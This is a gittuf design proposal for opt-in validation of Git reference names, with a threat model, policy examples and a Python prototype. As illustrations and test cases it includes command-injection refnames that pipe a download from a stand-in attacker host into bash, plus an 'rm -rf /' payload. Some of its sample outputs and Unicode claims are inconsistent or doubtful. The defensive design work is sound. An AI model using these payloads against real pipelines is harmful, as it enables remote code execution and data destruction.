# GAP-9: Refname Safety Policy — Policy-Driven Validation of Git Reference Names

## Metadata

* **Number:** 9
* **Title:** Refname Safety Policy — Policy-Driven Validation of Git Reference Names
* **Implemented:** No
* **Withdrawn/Rejected:** No
* **Sponsors:** Utkal Singh (singhutkal015@gmail.com)
* **Contributors:** Utkal Singh
* **Related GAPs:** None
* **Last Modified:** April 15, 2026

---

## Abstract

Git reference names (refnames) are attacker-controlled metadata. While gittuf provides
strong guarantees around the *authorization* and *integrity* of reference updates — via
policy, signed RSL entries, and Sigstore-backed key management — it treats refnames as
opaque byte strings during policy evaluation. This is correct from a cryptographic
standpoint but leaves a class of risks unaddressed: a properly authorized, signed, and
RSL-recorded reference update may carry a refname that is unsafe to interpret in
downstream execution contexts such as CI/CD pipelines, shell scripts, developer tooling,
and agentic workflows.

This proposal defines the boundary between "authorized" and "safe-to-interpret" as a
distinct security concern. It introduces an **optional, policy-driven refname validation
subsystem** in gittuf, operating at verification time and ref-update time, with two
modes — **audit** (warn only) and **enforce** (reject on violation). The subsystem
provides configurable constraints including allowlist patterns, Unicode normalization
requirements, character class restrictions, and advisory heuristics for encoding
anomalies and high-entropy strings. No existing gittuf guarantees are altered. All
mechanisms are opt-in and backwards compatible.

---

## Motivation

### The Authorization/Safety Boundary

gittuf's policy model answers the question: *"Was this ref update authorized by a
principal with sufficient trust for this namespace?"* It does not, and by design should
not, answer the question: *"Is this refname safe to process outside the Git object
store?"*

These are distinct properties. A ref update can simultaneously be:

* cryptographically signed by a trusted key,
* authorized by a valid gittuf policy rule,
* recorded faithfully in the RSL, **and**
* carry a refname that triggers unintended behavior when consumed by a CI/CD system,
  shell, logging pipeline, or human operator.

This is the gap this proposal addresses.

### Concrete Risk Classes

**Command injection.** Shell pipelines that interpolate refnames without quoting are
common across CI/CD configurations. A refname such as
`refs/heads/feature/$(curl -s https://attacker.example/payload | bash)` or
`refs/heads/branch; rm -rf /` is syntactically valid in Git and will be faithfully
transmitted over the wire. If a CI runner constructs a command like
`git checkout $BRANCH_NAME` without sanitization, the injected payload executes.
This class of attack is well-documented in the context of GitHub Actions, where
`github.head_ref` is a user-controlled string frequently interpolated into shell
commands.

**Unicode confusables and homoglyphs.** Unicode permits multiple visually
indistinguishable representations of what appears to be the same identifier. The
string `maın` (containing U+0131 LATIN SMALL LETTER DOTLESS I) is visually identical
to `main` on most rendering surfaces. A refname `refs/heads/maın` can receive
authorized pushes under a policy rule protecting `refs/heads/main`, because policy
pattern matching over byte strings treats them as distinct. A developer, code
reviewer, or an automated merge gate reading logs or UI output may not detect the
substitution. This class of ambiguity has been exploited in package-name confusion
attacks across npm, PyPI, and similar registries, and the same mechanism applies to
refnames.

**Invisible and control characters.** Git permits refnames to contain most Unicode
code points, including zero-width joiners, zero-width non-joiners, bidirectional
control characters (U+202E RIGHT-TO-LEFT OVERRIDE, U+200B ZERO WIDTH SPACE), and other
non-printing characters. A branch named `refs/heads/release/1.2.3\u200b` (with a
trailing zero-width space) is distinct from `refs/heads/release/1.2.3` at the byte
level but visually identical. RSL entries, audit logs, and SLSA provenance records
that contain these names may mislead human reviewers performing post-incident analysis.

**Namespace confusion.** gittuf reserves the `refs/gittuf/` namespace for its own
metadata (policy, RSL, attestations). A user-created branch
`refs/heads/gittuf/policy` is technically in a different namespace but may confuse
tooling, scripts, or developers that perform prefix-based filtering. More broadly,
refnames designed to resemble internal tooling references (`refs/heads/_internal`,
`refs/heads/.github`) can mislead automated systems.

**Encoded payloads and covert channels.** Base64-encoded or percent-encoded strings
in refnames (`refs/heads/aGVsbG8td29ybGQ=`) provide a covert channel for
communicating data through a signed, policy-compliant reference update. While a
single branch name carries limited bandwidth, an actor with push access to a namespace
could exfiltrate data or communicate instructions through a sequence of such refs.
Detectability is a relevant security property even when exploitability is constrained.

**AI agent and agentic pipeline risks.** Emerging CI/CD architectures delegate
repository operations to LLM-based agents that read refnames from API responses and
use them to construct further API calls or shell commands. These agents frequently
lack the contextual understanding to recognize visually deceptive refnames or injection
payloads. The risk surface is expanding as automation over Git metadata increases.

### Why gittuf Is the Right Layer

gittuf is uniquely positioned to address this class of risk because:

1. It is already in the verification critical path for ref updates.
2. Its policy model is repository-scoped and version-controlled, making refname
   constraints auditable artifacts.
3. It can annotate RSL entries with safety metadata without altering their integrity
   semantics.
4. It is the last common point before refnames propagate to diverse downstream
   consumers.

Addressing this at the CI/CD layer, the shell layer, or individual tooling layers
is possible but leads to fragmented, inconsistent protection. A centralized,
policy-expressed constraint defined once in gittuf and verified universally provides
stronger and more auditable guarantees.

**Important caveat.** gittuf cannot sanitize refnames at runtime or guarantee that
downstream consumers handle them safely. This proposal explicitly does not attempt
to do so. It provides policy-driven detection and optional prevention at the point
of ref update and verification. **Refnames must be treated as untrusted input outside
the Git execution boundary**, regardless of whether gittuf validation has passed.

---

## Specification

### Overview

This proposal adds a new optional policy attribute, `refname-safety`, to gittuf's
policy layer. When configured, this attribute governs the validation of refnames for
updates to refs within the specified namespace. The subsystem operates in one of two
modes and evaluates refnames against a set of configurable rules.

No change is made to gittuf's existing authorization semantics, key management, RSL
structure, or verification protocol. Repositories without `refname-safety`
configuration are unaffected.

### Policy Representation

The `refname-safety` configuration is expressed as an optional field within a
namespace rule in gittuf's policy. The following YAML representation is illustrative;
the canonical format is determined by gittuf's existing policy serialization layer
(TUF-based custom metadata).

```yaml
# Illustrative policy snippet — canonical form uses gittuf's TUF metadata format.

namespaces:
  - pattern: "refs/heads/*"
    principals:
      - key: "alice.pub"
      - key: "bob.pub"
    refname-safety:
      mode: enforce             # "audit" | "enforce"
      unicode-normalization: NFC  # "NFC" | "NFD" | "NFKC" | "NFKD" | "none"
      allow-patterns:
        - "^refs/heads/[a-zA-Z0-9._/-]+$"
      deny-patterns:
        - "^refs/heads/gittuf/"
      max-length: 255
      advisory-checks:
        invisible-characters: warn   # "warn" | "deny" | "off"
        high-entropy: warn           # "warn" | "deny" | "off"
        encoding-anomalies: warn     # "warn" | "deny" | "off"
        confusable-detection: warn   # "warn" | "deny" | "off"
        bidi-override: deny          # "warn" | "deny" | "off"

  - pattern: "refs/tags/*"
    principals:
      - key: "release-bot.pub"
    refname-safety:
      mode: audit
      unicode-normalization: NFKC
      allow-patterns:
        - "^refs/tags/v[0-9]+\\.[0-9]+\\.[0-9]+(-[a-zA-Z0-9.]+)?$"
      advisory-checks:
        invisible-characters: deny
        bidi-override: deny
        high-entropy: warn
        encoding-anomalies: warn
        confusable-detection: warn
```

### Validation Modes

**`audit` mode.** Validation is performed and any violations are reported as
structured warnings. The ref update is not blocked. Violations are recorded in the
RSL annotation associated with the entry (see Section 3.5). This mode is suitable for
initial rollout, migration, and environments where policy ownership is not yet
established.

**`enforce` mode.** Validation is performed and any violation causes the ref update to
be rejected before an RSL entry is created. The rejection is reported to the caller
with a structured error message identifying the rule(s) violated. Existing RSL entries
and policy state are not modified. This mode is suitable for production repositories
with established naming conventions.

The mode is a property of the namespace rule, not a global setting. Different
namespaces in the same repository may have different modes.

### Validation Rules

Validation rules are applied in the order listed. A refname fails validation if it
violates any rule that is configured as `deny` (in `enforce` mode) or generates a
warning (in `audit` mode).

#### Unicode Normalization Check

If `unicode-normalization` is set to a value other than `none`, the refname is checked
for normalization conformance. A refname is conformant if and only if applying the
specified Unicode normalization form (NFC, NFD, NFKC, or NFKD) to its string
representation produces the identical byte sequence.

*Rationale.* Git operates on refnames as byte strings and does not normalize Unicode.
Two refnames that are canonically equivalent under Unicode normalization (e.g.,
`café` composed vs. `café` decomposed) are distinct refs to Git but visually
identical to humans and to tools that normalize display. The NFKC form is the most
aggressive in collapsing compatibility equivalences (e.g., full-width characters,
ligatures) and is recommended for repositories requiring strict ASCII-like uniformity.

Non-conformant refnames in `enforce` mode are rejected with:

```
error: refname 'refs/heads/cafe\u0301' (NFD input) is not in NFC normalized form.
  Normalized form: 'refs/heads/caf\u00e9' (NFC)
  Suggestion: rename the branch to its normalized form before pushing.
```

#### Allow Pattern Matching

If `allow-patterns` is specified, the refname must match at least one pattern in the
list. Patterns are evaluated as Go regular expressions against the full refname string
(including the `refs/` prefix). An empty `allow-patterns` list is treated as
"allow all" (no constraint).

A refname that does not match any allow pattern in `enforce` mode is rejected with:

```
error: refname 'refs/heads/feature/my+branch' does not match any allowed pattern.
  Configured patterns:
    ^refs/heads/[a-zA-Z0-9._/-]+$
```

#### Deny Pattern Matching

If `deny-patterns` is specified, the refname must not match any pattern in the list.
Deny patterns take precedence over allow patterns. This allows an operator to carve
out specific exclusions from an otherwise broad allow pattern (e.g., reserving
`refs/heads/gittuf/` for internal use).

#### Maximum Length

If `max-length` is specified, the refname must not exceed the given number of bytes
in its UTF-8 encoded form. The default is 255 bytes, consistent with common
filesystem and network protocol limits.

#### Advisory Checks

Advisory checks are heuristic in nature and may produce false positives on legitimate
refnames. Each advisory check is independently configurable as `warn`, `deny`, or
`off`. All advisory checks default to `off` when the `refname-safety` block is
present but the check is not listed.

**`invisible-characters`.** Detects the presence of any Unicode code point with a
general category of `Cf` (format characters), `Cc` (control characters), or `Zs`
(separator space other than ASCII space U+0020), or the specific code points U+200B
(ZERO WIDTH SPACE), U+200C (ZERO WIDTH NON-JOINER), U+200D (ZERO WIDTH JOINER),
U+FEFF (BOM), U+00AD (SOFT HYPHEN), and the bidirectional control characters
U+202A–U+202E, U+2066–U+2069, U+200E, U+200F.

**`bidi-override`.** Detects the presence of Unicode bidirectional override characters
(U+202E RIGHT-TO-LEFT OVERRIDE, U+202D LEFT-TO-RIGHT OVERRIDE, U+2066–U+2069 FIRST
STRONG ISOLATE and related). These characters can cause a refname to render with a
different visual ordering than its logical byte ordering. This check should typically
be set to `deny` in any enforcement policy.

**`high-entropy`.** Computes the Shannon entropy of the component following the last
`/` in the refname (the "leaf name"). If the entropy exceeds a configurable threshold
(default 4.5 bits/character), a warning is emitted. This heuristic targets Base64,
hex-encoded, or other structured-payload strings. Threshold is configurable via
`high-entropy-threshold` (float, default 4.5).

```yaml
advisory-checks:
  high-entropy: warn
  high-entropy-threshold: 4.5
```

**`encoding-anomalies`.** Detects the presence of percent-encoded sequences (`%XX`),
Base64-like substrings matching `[A-Za-z0-9+/]{20,}={0,2}`, or other structured
encoding patterns in the refname leaf component. Targets covert channel usage.

**`confusable-detection`.** For each non-ASCII character in the refname, checks
whether a Unicode confusable mapping exists (per Unicode Technical Report #36) that
maps the character to an ASCII or commonly used character. Emits a warning with the
confusable mapping. This check is inherently imprecise and should be configured as
`warn` rather than `deny` unless the repository's naming policy is strictly ASCII.

### Integration Points

#### Ref Update Validation (Pre-RSL-Entry)

When `gittuf rsl record` (or equivalent) is called, the refname safety
validator is invoked before the RSL entry is created. In `enforce` mode, a validation
failure causes the operation to return an error without creating or pushing any RSL
entry. The Git ref state is not modified.

This is the primary enforcement point. It integrates naturally with gittuf's existing
pre-push workflow.

#### Verification Workflow

When `gittuf verify-ref` is executed, if `refname-safety` is configured for the
namespace containing the ref being verified, the validator is run against the refname.
Violations are reported as verification warnings (in `audit` mode) or verification
errors (in `enforce` mode) in the verification output.

This allows existing RSL entries recorded before the policy was introduced to be
flagged retroactively, supporting migration workflows.

#### RSL Annotation

In `audit` mode, if advisory checks produce warnings, gittuf may optionally create an
RSL annotation on the associated RSL entry with a structured payload recording the
violations. This provides a tamper-evident audit trail without blocking the update.
The annotation schema is:

```json
{
  "type": "refname-safety-audit",
  "refname": "refs/heads/feature/aGVsbG8=",
  "violations": [
    {
      "check": "encoding-anomalies",
      "severity": "warn",
      "detail": "Base64-like substring detected in leaf component: 'aGVsbG8='"
    }
  ],
  "policy-mode": "audit",
  "gittuf-version": "0.8.0"
}
```

Annotations are signed by the actor performing the verification, consistent with
existing gittuf annotation semantics.

#### CLI Surface

The following new or extended CLI commands are proposed:

```
# Validate a refname against the current policy without performing an update
gittuf verify-refname <refname>

# Check all current refs against policy (useful during rollout)
gittuf verify-refname --all

# Show refname safety configuration for a namespace
gittuf policy get-refname-safety <namespace-pattern>

# Add or update refname safety configuration (mirrors existing policy commands)
gittuf policy add-refname-safety <namespace-pattern> \
  --mode enforce \
  --unicode-normalization NFC \
  --allow-pattern "^refs/heads/[a-zA-Z0-9._/-]+$" \
  --advisory invisible-characters=deny \
  --advisory bidi-override=deny \
  --advisory high-entropy=warn
```

### Warning and Error Output Format

Structured output is emitted to stderr. Machine-readable JSON output is available via
`--format json`.

**Audit mode warning (human-readable):**

```
warning: refname safety audit for 'refs/heads/maın'
  namespace: refs/heads/*  (mode: audit)
  ├─ [WARN] confusable-detection: character 'ı' (U+0131 LATIN SMALL LETTER DOTLESS I)
  │         is a confusable for 'i' (U+0069). Full confusable mapping: 'maın' → 'main'
  │         This refname may be visually indistinguishable from 'refs/heads/main'.
  └─ [WARN] unicode-normalization: refname is in NFC form but NFKC normalization
            would produce a different result. NFKC form: 'refs/heads/main'
```

**Enforce mode error (human-readable):**

```
error: refname 'refs/heads/$(curl attacker.example)' rejected by safety policy
  namespace: refs/heads/*  (mode: enforce)
  ├─ [DENY] allow-patterns: refname does not match any allowed pattern
  │         configured patterns: ^refs/heads/[a-zA-Z0-9._/-]+$
  └─ [DENY] invisible-characters: control characters detected
            offending codepoints: U+200B (ZERO WIDTH SPACE)
  The RSL entry was not created. No ref state was modified.
```

**Machine-readable JSON (--format json):**

```json
{
  "refname": "refs/heads/$(curl attacker.example)",
  "namespace": "refs/heads/*",
  "mode": "enforce",
  "result": "rejected",
  "violations": [
    {
      "check": "allow-patterns",
      "severity": "deny",
      "detail": "refname does not match any configured allow-pattern"
    },
    {
      "check": "invisible-characters",
      "severity": "deny",
      "detail": "invisible character detected: U+200B (ZERO WIDTH SPACE)"
    }
  ]
}
```

---

## Reasoning

### Why Optional and Policy-Driven

Making refname safety constraints mandatory would constitute a backwards-incompatible
change for repositories that have existing branches with names that are valid under
Git's rules but would violate a strict allowlist. Emojis, non-ASCII scripts, and
unconventional naming patterns are legitimate in many workflows. Imposing a universal
restriction would break those workflows without consent.

A policy-driven opt-in model respects the diversity of legitimate use cases while
enabling organizations with stricter security requirements to enforce constraints
appropriate to their threat model. The policy is stored in gittuf's version-controlled,
signed metadata, making constraints auditable and attributable — consistent with
gittuf's existing philosophy.

### Why Not Runtime Sanitization

gittuf is a verification and authorization layer, not a runtime proxy. It cannot
intercept the moment at which a downstream system consumes a refname, and it has no
knowledge of how downstream systems parse strings. Attempting to sanitize refnames at
the gittuf layer would require knowing the escaping context (shell, SQL, YAML, HTML,
etc.) of every consumer, which is not feasible and not gittuf's responsibility.

The correct model is to prevent problematic refnames from being introduced into the
repository in the first place, via the enforcement mode, and to surface them as
auditable findings when they are present, via the audit mode. Downstream consumers
remain responsible for context-appropriate escaping of any data they receive from
external sources, including refnames. This proposal does not change that.

### Why Unicode Normalization Matters

Unicode normalization is not merely a display concern. Two distinct byte strings that
are canonically equivalent under Unicode will produce identical output when normalized,
meaning that refname-based policy patterns may be circumvented by an actor who supplies
a logically equivalent but byte-different name. If a policy grants push access to
`refs/heads/main` and the allow-pattern is matched against the normalized form, the
protection is meaningful. If not, a confusable like `refs/heads/maın` can receive
authorized updates from a principal with access to a different pattern while appearing
to modify the protected branch in audit logs.

NFC is the normalization form most commonly produced by text input on modern operating
systems. NFKC is more restrictive and collapses compatibility equivalences including
full-width Latin characters. The choice of normalization form is left to the policy
author, as both represent legitimate tradeoffs.

### Why Advisory Checks Are Heuristic

The entropy, encoding-anomaly, and confusable checks are inherently probabilistic.
A high-entropy branch name might be a legitimately random identifier in an automated
workflow. A confusable character might be part of a legitimate non-ASCII branch name
in a repository whose primary language is not English. Setting these to `deny` by
default would produce unacceptable false positive rates.

Configuring them as `warn` with RSL annotation provides the security-relevant
signal — the refname is potentially anomalous — while allowing human judgment to
determine the appropriate response. Organizations with strict ASCII-only naming
conventions may safely set these to `deny`.

### Scope Boundaries

This proposal explicitly does not:

* Modify gittuf's authorization model or key management layer.
* Alter RSL entry structure or verification semantics for authorized updates.
* Introduce any centralized infrastructure or network dependency.
* Propose runtime sanitization or output escaping.
* Define what constitutes a "safe" refname for any particular downstream consumer.
* Break any existing gittuf API or metadata format.

The scope is precisely: *optional, policy-expressed, repository-local constraints on
refname syntax, evaluated at ref update time and verification time.*

---

## Backwards Compatibility

This proposal introduces no backwards-incompatible changes.

Repositories without a `refname-safety` block in any namespace rule are entirely
unaffected. All validation is gated behind the presence of that configuration block.
Existing RSL entries, policy metadata, attestations, and verification outputs remain
valid and unmodified.

Repositories that add `refname-safety` configuration in `audit` mode during a rollout
period can observe violations without disrupting any existing workflow. Switching to
`enforce` mode is a deliberate, policy-owner-controlled step.

The new CLI commands (`gittuf verify-refname`) are additive. No existing commands are
modified or removed.

Policy metadata version: if gittuf's metadata versioning scheme requires it, the
presence of `refname-safety` in policy metadata increments the schema version in a
backwards-compatible manner, with older clients treating the unknown field as a
no-op (depending on gittuf's existing unknown-field handling policy).

---

## Security

### Threat Model

**Adversary capabilities.** The adversary has push access to one or more namespaces
in the repository as authorized by the current gittuf policy. They can create, update,
and delete refs within their authorized namespaces. They may be an insider with
legitimate access or an external actor who has compromised a signing key.

**Attack objectives.**

1. Create a refname designed to trigger unintended behavior when processed by a
   CI/CD pipeline, shell script, or automated tool that consumes the refname without
   sanitization (command injection, path traversal).
2. Create a refname visually indistinguishable from a protected or high-trust branch
   name to deceive human reviewers, merge gate operators, or audit log consumers.
3. Use refnames as a covert channel to exfiltrate data or communicate instructions
   through signed, policy-compliant repository operations.

**What this proposal defends against.** In `enforce` mode with a well-configured
`allow-patterns` rule, cases 1, 2, and 3 are prevented for the configured namespaces.
In `audit` mode, they are detected and logged.

**Non-goals.**

* This proposal does not defend against an adversary who controls the gittuf policy
  itself (i.e., the root trust hierarchy). Such an adversary could simply remove the
  `refname-safety` rule. Policy integrity is the responsibility of the existing
  gittuf trust model.
* This proposal does not defend against injection attacks in downstream consumers that
  would occur even with a "safe" refname (e.g., a consumer that is vulnerable to
  a branch named `main; rm -rf /` should not be relying solely on gittuf validation).
* This proposal does not sanitize refnames for consumers. The output of
  `gittuf verify-refname` is a verification result, not a sanitized string.
* Unicode confusable detection is heuristic and cannot guarantee that all visually
  ambiguous names are detected. Operators requiring strict uniqueness guarantees should
  use a restrictive `allow-patterns` rule (e.g., ASCII-only).
* Entropy and encoding anomaly detection are heuristic and can be evaded by an
  adversary who avoids triggering thresholds. These checks are early-warning signals,
  not hard security guarantees.

**Trust boundaries.** The refname safety policy, like all gittuf policy, is trusted
only as far as the root key hierarchy is trusted. An actor who can modify the policy
can disable refname safety constraints. This is a known and acceptable property of any
policy-based system.

**Residual risk.** This proposal reduces but does not eliminate refname-based risk.
Consumers of refnames from any source — including gittuf-protected repositories —
**must treat refnames as untrusted input outside the Git execution boundary** and apply
context-appropriate escaping or allowlisting at the point of consumption. This is the
correct and complete defense; gittuf's refname safety policy is a defence-in-depth
layer, not a substitute for correct output handling.

---

## Prototype Implementation

The following Python script demonstrates the creation of representative problematic
refnames using only the Git CLI (no filesystem manipulation), then validates them
against a simple implementation of the rules in this proposal.

```python
#!/usr/bin/env python3
"""
GAP-9 Refname Safety — Prototype / Proof of Concept
====================================================
Demonstrates:
  1. Creation of problematic Git refs using only the Git CLI.
  2. A minimal refname validator implementing the rules proposed in GAP-9.

Requirements: Python 3.9+, Git 2.28+
Usage:
  python3 poc_refname_safety.py
  # Runs inside a temporary Git repository; cleans up on exit.
"""

import subprocess
import tempfile
import os
import re
import unicodedata
import math
import shutil
from dataclasses import dataclass, field

# ---------------------------------------------------------------------------
# Validator
# ---------------------------------------------------------------------------

@dataclass
class RefnameSafetyPolicy:
    mode: str = "audit"                        # "audit" | "enforce"
    unicode_normalization: str = "NFC"         # "NFC"|"NFD"|"NFKC"|"NFKD"|"none"
    allow_patterns: list[str] = field(default_factory=list)
    deny_patterns: list[str] = field(default_factory=list)
    max_length: int = 255
    invisible_characters: str = "deny"         # "warn"|"deny"|"off"
    bidi_override: str = "deny"                # "warn"|"deny"|"off"
    high_entropy: str = "warn"                 # "warn"|"deny"|"off"
    high_entropy_threshold: float = 4.5
    encoding_anomalies: str = "warn"           # "warn"|"deny"|"off"
    confusable_detection: str = "warn"         # "warn"|"deny"|"off"


@dataclass
class Violation:
    check: str
    severity: str   # "warn" | "deny"
    detail: str


# Unicode bidirectional override code points
BIDI_OVERRIDES = {
    0x202A, 0x202B, 0x202C, 0x202D, 0x202E,   # LRE, RLE, PDF, LRO, RLO
    0x2066, 0x2067, 0x2068, 0x2069,             # LRI, RLI, FSI, PDI
    0x200E, 0x200F,                              # LRM, RLM
}

# Invisible / format characters beyond bidi
INVISIBLE_CHARS = {
    0x200B,  # ZERO WIDTH SPACE
    0x200C,  # ZERO WIDTH NON-JOINER
    0x200D,  # ZERO WIDTH JOINER
    0xFEFF,  # BOM / ZERO WIDTH NO-BREAK SPACE
    0x00AD,  # SOFT HYPHEN
}


def _shannon_entropy(s: str) -> float:
    if not s:
        return 0.0
    freq = {}
    for c in s:
        freq[c] = freq.get(c, 0) + 1
    n = len(s)
    return -sum((f / n) * math.log2(f / n) for f in freq.values())


def validate_refname(refname: str, policy: RefnameSafetyPolicy) -> list[Violation]:
    violations: list[Violation] = []

    def add(check, sev, detail):
        violations.append(Violation(check=check, severity=sev, detail=detail))

    # --- Max length ---
    if len(refname.encode("utf-8")) > policy.max_length:
        add("max-length", "deny",
            f"refname is {len(refname.encode('utf-8'))} bytes; limit is {policy.max_length}")

    # --- Unicode normalization ---
    if policy.unicode_normalization != "none":
        form = policy.unicode_normalization
        normalized = unicodedata.normalize(form, refname)
        if normalized != refname:
            add("unicode-normalization", "deny",
                f"refname is not in {form} form. Normalized: '{normalized}'")

    # --- Allow patterns ---
    if policy.allow_patterns:
        matched = any(re.fullmatch(p, refname) for p in policy.allow_patterns)
        if not matched:
            add("allow-patterns", "deny",
                f"refname does not match any configured allow-pattern: "
                + ", ".join(repr(p) for p in policy.allow_patterns))

    # --- Deny patterns ---
    for p in policy.deny_patterns:
        if re.search(p, refname):
            add("deny-patterns", "deny",
                f"refname matches deny-pattern '{p}'")

    # --- Bidi override characters ---
    if policy.bidi_override != "off":
        found = [hex(ord(c)) for c in refname if ord(c) in BIDI_OVERRIDES]
        if found:
            add("bidi-override", policy.bidi_override,
                f"bidirectional override characters detected: {found}")

    # --- Invisible characters ---
    if policy.invisible_characters != "off":
        found_invis = []
        for c in refname:
            cp = ord(c)
            cat = unicodedata.category(c)
            if cp in BIDI_OVERRIDES:
                continue  # already reported above
            if cp in INVISIBLE_CHARS or cat in ("Cf", "Cc") and cp >= 0x80:
                found_invis.append(f"U+{cp:04X} ({unicodedata.name(c, 'UNKNOWN')})")
        if found_invis:
            add("invisible-characters", policy.invisible_characters,
                f"invisible/format characters detected: {found_invis}")

    # --- High entropy ---
    if policy.high_entropy != "off":
        leaf = refname.rsplit("/", 1)[-1]
        entropy = _shannon_entropy(leaf)
        if entropy > policy.high_entropy_threshold:
            add("high-entropy", policy.high_entropy,
                f"leaf component '{leaf}' has Shannon entropy {entropy:.2f} "
                f"(threshold: {policy.high_entropy_threshold})")

    # --- Encoding anomalies ---
    if policy.encoding_anomalies != "off":
        leaf = refname.rsplit("/", 1)[-1]
        if re.search(r"%[0-9A-Fa-f]{2}", leaf):
            add("encoding-anomalies", policy.encoding_anomalies,
                f"percent-encoded sequence detected in leaf: '{leaf}'")
        if re.search(r"[A-Za-z0-9+/]{20,}={0,2}", leaf):
            add("encoding-anomalies", policy.encoding_anomalies,
                f"Base64-like substring detected in leaf: '{leaf}'")

    # --- Confusable detection (simplified: flag non-ASCII that NFKC maps to ASCII) ---
    if policy.confusable_detection != "off":
        confusables = []
        for c in refname:
            if ord(c) > 127:
                nfkc = unicodedata.normalize("NFKC", c)
                if nfkc != c and all(ord(x) < 128 for x in nfkc):
                    confusables.append(
                        f"'{c}' (U+{ord(c):04X} {unicodedata.name(c, '?')}) → '{nfkc}'"
                    )
        if confusables:
            add("confusable-detection", policy.confusable_detection,
                f"potential confusables detected: {confusables}")

    return violations


def report(refname: str, violations: list[Violation], policy: RefnameSafetyPolicy):
    has_deny = any(v.severity == "deny" for v in violations)
    result = "REJECTED" if (has_deny and policy.mode == "enforce") else \
             "AUDITED"  if violations else "PASSED"

    print(f"\n{'─'*70}")
    print(f"  Refname : {repr(refname)}")
    print(f"  Mode    : {policy.mode}   Result: {result}")
    if not violations:
        print("  ✓ No violations.")
        return
    for v in violations:
        icon = "✗" if v.severity == "deny" else "⚠"
        print(f"  {icon} [{v.severity.upper():4}] {v.check}")
        print(f"         {v.detail}")


# ---------------------------------------------------------------------------
# Demo: create problematic refs in a temporary Git repository
# ---------------------------------------------------------------------------

def git(*args, cwd=None, check=True, capture=False):
    kwargs = dict(cwd=cwd, check=check)
    if capture:
        kwargs["capture_output"] = True
        kwargs["text"] = True
    return subprocess.run(["git", *args], **kwargs)


def create_ref(refname: str, cwd: str) -> bool:
    """Create a ref pointing at HEAD using git update-ref."""
    head = subprocess.run(
        ["git", "rev-parse", "HEAD"],
        cwd=cwd, capture_output=True, text=True
    ).stdout.strip()
    result = subprocess.run(
        ["git", "update-ref", refname, head],
        cwd=cwd, capture_output=True, text=True
    )
    if result.returncode != 0:
        print(f"  [git rejected]  {repr(refname)}: {result.stderr.strip()}")
        return False
    return True


def main():
    tmpdir = tempfile.mkdtemp(prefix="gap9-poc-")
    try:
        print(f"Working in temporary repository: {tmpdir}")

        # Initialise bare-minimum repo
        git("init", cwd=tmpdir)
        git("config", "user.email", "poc@example.com", cwd=tmpdir)
        git("config", "user.name", "GAP-9 PoC", cwd=tmpdir)
        # Create an initial commit so HEAD is resolvable
        dummy = os.path.join(tmpdir, "README.md")
        with open(dummy, "w") as f:
            f.write("GAP-9 PoC\n")
        git("add", "README.md", cwd=tmpdir)
        git("commit", "-m", "Initial commit", cwd=tmpdir)

        # ------------------------------------------------------------------
        # Define an example policy
        # ------------------------------------------------------------------
        policy = RefnameSafetyPolicy(
            mode="enforce",
            unicode_normalization="NFC",
            allow_patterns=[r"^refs/heads/[a-zA-Z0-9._/-]+$"],
            deny_patterns=[r"^refs/heads/gittuf/"],
            invisible_characters="deny",
            bidi_override="deny",
            high_entropy="warn",
            high_entropy_threshold=4.5,
            encoding_anomalies="warn",
            confusable_detection="warn",
        )

        # ------------------------------------------------------------------
        # Test cases
        # ------------------------------------------------------------------
        test_cases = [
            # (description, refname)
            (
                "LEGITIMATE — simple branch name",
                "refs/heads/feature/add-login",
            ),
            (
                "INJECTION — shell metacharacters in branch name",
                "refs/heads/$(curl -s https://attacker.example/payload|bash)",
            ),
            (
                "UNICODE CONFUSABLE — dotless-i 'ı' (U+0131) instead of 'i'",
                # refs/heads/maın — 'ı' is U+0131 LATIN SMALL LETTER DOTLESS I
                "refs/heads/ma\u0131n",
            ),
            (
                "INVISIBLE — zero-width space in branch name",
                "refs/heads/release/1.2.3\u200b",
            ),
            (
                "BIDI OVERRIDE — right-to-left override character",
                "refs/heads/patch\u202e/main",
            ),
            (
                "HIGH ENTROPY — base64-like leaf",
                "refs/heads/aGVsbG8td29ybGQtdGhpcy1pcy1hLXRlc3Q=",
            ),
            (
                "NAMESPACE CONFUSION — reserved gittuf namespace",
                "refs/heads/gittuf/policy-shadow",
            ),
            (
                "ENCODING ANOMALY — percent-encoded component",
                "refs/heads/feature%2Fbranch",
            ),
            (
                "UNICODE CONFUSABLE — full-width Latin (NFKC collapses)",
                # U+FF4D = FULLWIDTH LATIN SMALL LETTER M
                "refs/heads/\uff4d\uff41\uff49\uff4e",
            ),
        ]

        print("\n" + "="*70)
        print("  GAP-9 Refname Safety — Prototype Validation")
        print("="*70)

        for desc, refname in test_cases:
            print(f"\n  ┌─ {desc}")
            created = create_ref(refname, cwd=tmpdir)
            if created:
                print(f"  │  Git accepted ref:  {repr(refname)}")
            violations = validate_refname(refname, policy)
            report(refname, violations, policy)

        print(f"\n{'─'*70}")
        print("\nPoC complete.\n")
        print("Key takeaway: Git accepted several problematic refs without error.")
        print("gittuf's refname safety policy (GAP-9) would have rejected or")
        print("flagged each of them at ref-update time, before RSL entry creation.")

    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


if __name__ == "__main__":
    main()
```

### Expected Output (representative)

```
Working in temporary repository: /tmp/gap9-poc-XXXXXXXX

======================================================================
  GAP-9 Refname Safety — Prototype Validation
======================================================================

  ┌─ LEGITIMATE — simple branch name

──────────────────────────────────────────────────────────────────────
  Refname : 'refs/heads/feature/add-login'
  Mode    : enforce   Result: PASSED
  ✓ No violations.

  ┌─ INJECTION — shell metacharacters in branch name
  [git rejected]  'refs/heads/$(curl -s https://attacker.example/payload|bash)':
                  fatal: 'refs/heads/$(curl...' is not a valid ref name

  ┌─ [Git rejects this one — but many injection payloads ARE accepted]

  ┌─ UNICODE CONFUSABLE — dotless-i 'ı' (U+0131)
  │  Git accepted ref:  'refs/heads/maın'

──────────────────────────────────────────────────────────────────────
  Refname : 'refs/heads/maın'
  Mode    : enforce   Result: REJECTED
  ✗ [DENY] allow-patterns
         refname does not match '^refs/heads/[a-zA-Z0-9._/-]+$'
  ⚠ [WARN] confusable-detection
         'ı' (U+0131 LATIN SMALL LETTER DOTLESS I) → 'i'

  ┌─ INVISIBLE — zero-width space in branch name
  │  Git accepted ref:  'refs/heads/release/1.2.3​'

──────────────────────────────────────────────────────────────────────
  Refname : 'refs/heads/release/1.2.3\u200b'
  Mode    : enforce   Result: REJECTED
  ✗ [DENY] allow-patterns
         refname does not match configured pattern
  ✗ [DENY] invisible-characters
         U+200B (ZERO WIDTH SPACE) detected

  ┌─ BIDI OVERRIDE
  │  Git accepted ref:  'refs/heads/patch\u202e/main'

──────────────────────────────────────────────────────────────────────
